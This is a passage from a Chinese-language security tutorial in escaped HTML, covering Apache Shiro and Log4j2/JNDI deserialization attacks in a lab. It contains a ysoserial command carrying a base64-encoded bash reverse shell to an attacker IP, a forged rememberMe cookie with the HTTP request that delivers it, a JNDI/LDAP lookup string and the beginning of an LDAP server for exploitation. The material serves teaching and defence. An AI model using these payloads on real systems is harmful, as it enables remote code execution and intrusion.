&lt;p&gt;java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}”&lt;/p&gt;
&lt;p&gt;4. 生成 cookie&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 shiro.py 192.168.142.132:8888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;结果：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5. 发送 payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /doLogin HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.142.128:8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Origin: http://192.168.142.128:8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.142.128:8080/doLogin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JSESSIONID=BE2042921ED0A1E58436F6FBD5654581;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w== &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;username=a&amp;amp;password=b&amp;amp;rememberme=remember-me&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修复和防御&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1、升级Apache Shiro到最版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2、部署安全产品&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;log4j2-反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#log4j2-反序列化&#34;&gt;#&lt;/a&gt; log4j2 反序列化&lt;/h3&gt;
&lt;p&gt;Log for Java，Apache 的开源日志记录组件，使用非常广泛&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用方法：&lt;/p&gt;
&lt;p&gt;1、pom 引入依赖&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;dependencies&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;groupId&amp;gt;com.unboundid&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;artifactId&amp;gt;unboundid-ldapsdk&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;version&amp;gt;6.0.3&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;groupId&amp;gt;mysql&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;artifactId&amp;gt;mysql-connector-java&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;version&amp;gt;5.1.35&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/dependencies&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2、获得 logger 实例&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import org.apache.logging.log4j.LogManager;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import org.apache.logging.log4j.Logger;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Log4JTest &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static final Logger logger = LogManager.getLogger(Log4JTest.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&amp;quot;wuya 666&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // logger.error(&amp;quot;wuya 666&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //logger.error(&amp;quot;$&amp;#123;java:runtime&amp;#125; - $&amp;#123;java:vm&amp;#125; - $&amp;#123;java:os&amp;#125;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3、其中 Log4j 包括的日志等级层级分别为：ALL &amp;lt; DEBUG &amp;lt; INFO &amp;lt; WARN &amp;lt; ERROR &amp;lt; FATAL &amp;lt; OFF。&lt;/p&gt;
&lt;p&gt;在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：&lt;/p&gt;
&lt;p&gt;log4j2 日志与 print 的区别&lt;/p&gt;
&lt;p&gt;可以输出到文件&lt;/p&gt;
&lt;p&gt;可以输出不同类型级别的日志&lt;/p&gt;
&lt;p&gt;上线时不需要修改，不需要删除 println&lt;/p&gt;
&lt;p&gt;便于分析追溯切割&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;LDAP&lt;/p&gt;
&lt;p&gt;轻量级目录访问协议&lt;/p&gt;
&lt;p&gt;目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象 Linux/Unix 系统中的文件目录一样。&lt;/p&gt;
&lt;p&gt;可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。&lt;/p&gt;
&lt;p&gt;LDAP 在统一身份认证领域比较多，比如 Windows 的域环境&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140137271.png&#34; alt=&#34;image-20221126140137271&#34;&gt;&lt;/p&gt;
&lt;p&gt;LDAP 的树状结构组织数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125195016231.png&#34; alt=&#34;image-20221125195016231&#34;&gt;&lt;/p&gt;
&lt;p&gt;LDAP 适合 C/S 架构，SSO (单点登录) 适合 B/S 架构&lt;/p&gt;
&lt;p&gt;JNDI&lt;/p&gt;
&lt;p&gt;Java 命名和目录接口（命名服务接口）&lt;/p&gt;
&lt;p&gt;用于根据名字找到位置、服务、信息、资源、对象等 K V&lt;/p&gt;
&lt;p&gt;可以理解为有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/bfd6e2fc555bc73870672c5c8fe5e548.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;JNDI 基本操作：&lt;/p&gt;
&lt;p&gt;1、发布服务（名字和资源的映射）： bind ()&lt;/p&gt;
&lt;p&gt;2、用名字查找资源： lookup ()&lt;/p&gt;
&lt;p&gt;采用 JNDI 方式连接数据库，我们无需在关注数据库的连接参数，当参数改变，我们的调用代码不发生改变&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public void jndiConnet() throws SQLException, NamingException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Context ctx=new InitialContext();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Object datasourceRef=ctx.lookup(&amp;quot;java:jdbc/mydatasource&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        DataSource ds=(DataSource)datasourceRef;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Connection conn=ds.getConnection();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Statement st=conn.createStatement();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ResultSet rs=st.executeQuery(&amp;quot;select * from users where id =1 &amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        while(rs.next())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            System.out.println(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;quot;name:&amp;quot;+rs.getString(&amp;quot;name&amp;quot;)+&amp;quot;\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            +&amp;quot;password:&amp;quot;+rs.getString(&amp;quot;password&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rs.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        st.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        conn.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140836409.png&#34; alt=&#34;image-20221126140836409&#34;&gt;&lt;/p&gt;
&lt;p&gt;JNDI 可以访问：&lt;/p&gt;
&lt;p&gt;LDAP 目录服务、RMI 远程方法调用、DNS、XNam 、Novell 目录服务、 CORBA 对象服务、文件系统、WindowsXP/2000/NT/Me/9x 的注册表、DSMLv1&amp;amp;v2、NIS&lt;/p&gt;
&lt;p&gt;而这些通过 lookup 方法完成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140957355.png&#34; alt=&#34;image-20221126140957355&#34;&gt;&lt;/p&gt;
&lt;p&gt;lookup&lt;/p&gt;
&lt;p&gt;假如现在想要通过日志输出一个 Java 对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，可以使用 lookup 查找&lt;/p&gt;
&lt;p&gt;lookup 相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。&lt;/p&gt;
&lt;p&gt;JNDI 可以使用 lookup 查找 docker,java,jndi,log4j 等内容&lt;/p&gt;
&lt;p&gt;JNDI 和 LDAP 关系&lt;/p&gt;
&lt;p jndi:ldap:wuya.com:5678test=&#34;&#34;&gt;$&lt;/p&gt;
&lt;p&gt;通过名字，查找（lookup）LDAP 的服务，获取 LDAP 中存储的数据&lt;/p&gt;
&lt;p&gt;下面举了个例子，通过 JNDI 查找 LDAP 中的 UID 和 DN&lt;/p&gt;
&lt;p&gt;server:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class LDAPSeriServer &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static final String LDAP_BASE = &amp;quot;dc=example,dc=com&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) throws IOException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int port = 7389;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            config.setListenerConfigs(new InMemoryListenerConfig(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;quot;listen&amp;quot;, //$NON-NLS-1$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    InetAddress.getByName(&amp;quot;0.0.0.0&amp;quot;), //$NON-NLS-1$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    port,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    ServerSocketFactory.getDefault(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    SocketFactory.getDefault(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    (SSLSocketFactory) SSLSocketFactory.getDefault()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            config.setSchema(null);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            config.setEnforceAttributeSyntaxCompliance(false);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            config.setEnforceSingleStructuralObjectClass(false);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ds.add(&amp;quot;dn: &amp;quot; + &amp;quot;dc=example,dc=com&amp;quot;, &amp;quot;objectClass: top&amp;quot;, &amp;quot;objectclass: 